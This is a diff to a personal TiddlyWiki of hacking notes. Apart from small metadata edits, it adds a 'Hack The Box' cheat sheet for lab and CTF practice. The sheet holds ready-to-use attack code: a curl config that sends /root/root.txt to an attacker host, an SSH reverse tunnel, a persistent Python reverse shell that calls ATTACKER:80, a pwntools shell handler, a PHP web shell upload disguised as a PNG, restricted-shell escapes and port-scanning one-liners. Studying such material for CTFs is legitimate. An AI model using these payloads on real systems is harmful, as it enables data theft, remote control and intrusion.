@@ -230,6 +230,8 @@ Error message and password prompt
 
 <li>hash length extension attack</li>
 
+<li>HTB Notes</li>
+
 <li>ISITDTU CTF 2018 Quals</li>
 
 <li>Malicious document analysis</li>
@@ -8685,7 +8687,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234616405" modified="20180517191701014" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div list="[[CSAW 2018 Quals]]" title="$:/StoryList">
+<div list="" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9254,7 +9256,7 @@ Heap manager manages small allocations 8 bytes minimum
 
 Default Process heap is always created when process is created. GetProcessHeap returns handle to this heap. HeapCreate can create more heap. Heap size can be fixed or grow. Default is growable. Low Fragmentation Heap (LFH) deals with memory fragmentation issues.</pre>
 </div>
-<div created="20180424234251670" modified="20180806183757734" tags="" title="About">
+<div created="20180424234251670" modified="20181228151622736" tags="" title="About">
 <pre>This page contains random notes.
 Blog: &lt;a href=&quot;http://boredhackerblog.info&quot;&gt;http://boredhackerblog.info&lt;/a&gt;
 
@@ -9275,6 +9277,8 @@ Notes:
 [[VulnHub Notes]]
 
 [[OSCP Notes]]
+
+[[HTB Notes]]
 </pre>
 </div>
 <div created="20180806133453879" modified="20180806141733073" title="Advanced Malware Analysis: Combating Exploit Kits">
@@ -10398,6 +10402,99 @@ for i in range(8,33): #count from 8 to 32, since signkey length is randomly from
     print r.read() #read stuff
     print r.read() #read stuff
 
+```</pre>
+</div>
+<div created="20181228151627892" modified="20181228165739289" title="HTB Notes">
+<pre>Hackthebox notes/things learned
+
+privesc:
+
+if curl is running as root, and a config file is used:
+
+//get shadow, sudoers
+
+//use -o (instead of -x --data...) to put new sudoers file
+
+curl config:
+
+```
+url = &quot;http://ATTACKER&quot;
+-X &quot;POST&quot;
+--data-binary @/root/root.txt
+```
+
+ssh with private key: ssh -i key
+
+tunneling: ssh -D 8080
+
+nmap w/ tunnel: ``--proxy socks4://127.0.0.1:8080``
+
+rev shh tun:
+ssh -R 3306:localhost:3306 root@ATTACKER
+
+url encoding https://tipstrickshack.blogspot.com/2013/02/how-to-bypassing-filter-to-traversal_8831.html
+
+restricted shell escape: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+
+ed editor to shell: ``!'/bin/sh'`` or bash...
+
+capabilities (getcaps/setcaps) in linux:
+https://webcache.googleusercontent.com/search?q=cache:HWAto2zXysIJ:https://packetstorm.foofus.com/papers/attack/exploiting_capabilities_the_dark_side.pdf+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=us
+
+rev shell with loop:
+
+```
+import socket,subprocess,os,time;
+while True:
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+        s.connect((&quot;ATTACKER&quot;,80));os.dup2(s.fileno(),0);
+        os.dup2(s.fileno(),1);
+        os.dup2(s.fileno(),2);
+        p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+    except:
+        time.sleep(5);
+        continue
+```
+
+handler w/ pwntools and auto command execution on connect:
+
+```
+from pwn import *
+from time import sleep
+l = listen(80)
+l.sendline(&quot;&quot;&quot;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&quot;&quot;&quot;)
+l.sendline(&quot;export TERM=xterm&quot;)
+l.sendline(&quot;&quot;&quot;alias ls='ls -lha --color=auto'&quot;&quot;&quot;)
+l.interactive()
+```
+
+php shell upload:
+
+```
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;link.png.php&quot;
+
+Content-Type: image/png
+
+#Have valid PNG header info here
+&lt;?php
+if(isset($_REQUEST['cmd'])){
+        echo &quot;&lt;pre&gt;&quot;;
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo &quot;&lt;/pre&gt;&quot;;
+        die;
+}
+?&gt;
+```
+
+faster scanning:
+
+```
+masscan + nmap (learned from jerry writeup by egre55)
+masscan -p1-65535 10.10.10.95 --rate=1000 -e tun0 &gt; ports
+ports=$(cat ports | awk -F &quot; &quot; '{print $4}' | awk -F &quot;/&quot; '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+nmap -Pn -sV -sC -p$ports 10.10.10.95
 ```</pre>
 </div>
 <div created="20180729155552850" modified="20180730010855868" title="ISITDTU CTF 2018 Quals">
